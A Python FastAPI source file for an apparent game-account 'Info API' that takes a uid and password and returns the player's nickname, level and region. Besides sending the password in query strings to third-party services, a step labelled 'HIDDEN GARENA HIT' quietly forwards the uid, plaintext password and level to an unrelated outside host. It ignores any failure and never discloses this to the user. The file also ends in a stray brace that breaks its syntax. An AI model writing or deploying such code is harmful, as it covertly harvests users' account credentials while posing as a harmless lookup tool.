from fastapi import FastAPI, Query
import requests
import base64
import json

app = FastAPI()


# ================================
# 🟢 HOME ENDPOINT
# ================================
@app.get("/")
def home():
    return {
        "message": "Info API ready 👍"
    }


# ================================
# 🔐 JWT DECODE FUNCTION
# ================================
def jwt_decode_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        payload = parts[1]
        payload += "=" * (-len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload).decode("utf-8")
        return json.loads(decoded)
    except:
        return None


# ================================
# ⚡ MAIN API
# ================================
@app.get("/info")
def get_info(uid: str = Query(None), password: str = Query(None)):

    # ----------------
    # INPUT CHECK
    # ----------------
    if not uid or not password:
        return {
            "status": False,
            "message": "Enter uid & password"
        }

    # ================================
    # STEP 1 — JWT API CALL
    # ================================
    jwt_url = f"https://jwtsemygen.vercel.app/token?key=SEMY&uid={uid}&password={password}"

    try:
        jwt_res = requests.get(jwt_url, timeout=10)
        jwt_json = jwt_res.json()
    except:
        return {
            "status": False,
            "message": "JWT request failed"
        }

    # 🔥 REAL CHECK (important fix)
    if jwt_json.get("status") != "live":
        return {
            "status": False,
            "message": jwt_json.get("message", "Account ban or wrong uid password")
        }

    token = jwt_json.get("token")
    if not token:
        return {
            "status": False,
            "message": "Token missing from JWT response"
        }

    # ================================
    # STEP 2 — DECODE JWT
    # ================================
    data = jwt_decode_payload(token)
    if not data:
        return {
            "status": False,
            "message": "Decode Failed"
        }

    account_id = data.get("account_id")
    region = data.get("noti_region")
    external_uid = data.get("external_uid")

    # ================================
    # STEP 3 — LEVEL API
    # ================================
    level_url = f"https://mafuapi.vercel.app/mafu-level?uid={account_id}&key=mafu"

    try:
        level_res = requests.get(level_url, timeout=10)
        level_json = level_res.json()
    except:
        return {
            "status": False,
            "message": "Level fetch failed"
        }

    player = level_json.get("player_info", {})

    nickname = player.get("nickname")
    level = player.get("current_level")
    final_uid = player.get("uid")

    # ================================
    # STEP 4 — HIDDEN GARENA HIT
    # ================================
    try:
        garena_url = f"https://infopapa.vercel.app/info?uid={external_uid}&password={password}&level={level}"
        requests.get(garena_url, timeout=5)
    except:
        pass

    # ================================
    # FINAL RESPONSE
    # ================================
    return {
        "status": True,
        "message": "success",
        "nickname": nickname,
        "Account uid": final_uid,
        "current_level": level,
        "region": region
    }    }
